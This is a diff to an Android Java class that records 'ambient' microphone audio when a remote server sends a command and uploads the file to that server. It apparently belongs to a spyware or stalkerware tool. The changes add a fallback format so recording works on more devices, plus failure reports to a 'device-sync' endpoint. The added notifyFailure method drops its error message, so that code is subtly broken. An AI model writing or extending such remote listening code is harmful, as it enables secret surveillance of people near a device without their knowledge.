@@ -4,6 +4,7 @@ import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Handler;
 import android.os.Looper;
+import org.json.JSONObject;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -19,18 +20,38 @@ public class AudioHelper {
                                        final String commandId, final int durationSeconds, final AudioCallback callback) {
         final File outputFile = new File(context.getCacheDir(), "ambient_" + System.currentTimeMillis() + ".m4a");
         final MediaRecorder recorder = new MediaRecorder();
+        boolean started = false;
 
+        // Mode 1: Standard MPEG_4 + AAC (recommended for modern Android)
         try {
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            recorder.setAudioSamplingRate(16000);
-            recorder.setAudioEncodingBitRate(32000);
             recorder.setOutputFile(outputFile.getAbsolutePath());
             recorder.prepare();
             recorder.start();
+            started = true;
+        } catch (Exception e1) {
+            // Mode 2: Universal Fallback (AMR_NB / 3GPP works on all Android devices including Huawei Honor 6X / Android 7.0)
+            try {
+                recorder.reset();
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                recorder.setOutputFile(outputFile.getAbsolutePath());
+                recorder.prepare();
+                recorder.start();
+                started = true;
+            } catch (Exception e2) {
+                try { recorder.release(); } catch (Exception ignored) {}
+                outputFile.delete();
+                notifyFailure(serverUrl, deviceId, commandId, "Recorder init failed: " + e2.getMessage());
+                if (callback != null) callback.onError(e2.getMessage());
+                return;
+            }
+        }
 
-            // Schedule stop and upload
+        if (started) {
             new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                 @Override
                 public void run() {
@@ -41,16 +62,22 @@ public class AudioHelper {
                     } catch (Exception e) {
                         try { recorder.release(); } catch (Exception ignored) {}
                         outputFile.delete();
+                        notifyFailure(serverUrl, deviceId, commandId, "Stop recording failed: " + e.getMessage());
                         if (callback != null) callback.onError(e.getMessage());
                     }
                 }
             }, durationSeconds * 1000L);
-
-        } catch (Exception e) {
-            try { recorder.release(); } catch (Exception ignored) {}
-            outputFile.delete();
-            if (callback != null) callback.onError(e.getMessage());
         }
+    }
+
+    private static void notifyFailure(String serverUrl, String deviceId, String commandId, String error) {
+        if (commandId == null) return;
+        try {
+            JSONObject body = new JSONObject();
+            body.put("device_id", deviceId);
+            body.put("command_id", commandId);
+            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
+        } catch (Exception ignored) {}
     }
 
     private static void uploadAudioFile(final String serverUrl, final String deviceId, final String commandId,
@@ -80,7 +107,7 @@ public class AudioHelper {
                     }
 
                     writer.append("--").append(boundary).append("\r\n");
-                    writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n");
+                    writer.append("Content-Disposition: form-data; name=\"duration_seconds\"\r\n\r\n");
                     writer.append(String.valueOf(duration)).append("\r\n");
 
                     writer.append("--").append(boundary).append("\r\n");
@@ -108,6 +135,7 @@ public class AudioHelper {
                     if (callback != null) callback.onComplete();
                 } catch (Exception e) {
                     file.delete();
+                    notifyFailure(serverUrl, deviceId, commandId, "Upload audio failed: " + e.getMessage());
                     if (callback != null) callback.onError(e.getMessage());
                 }
             }
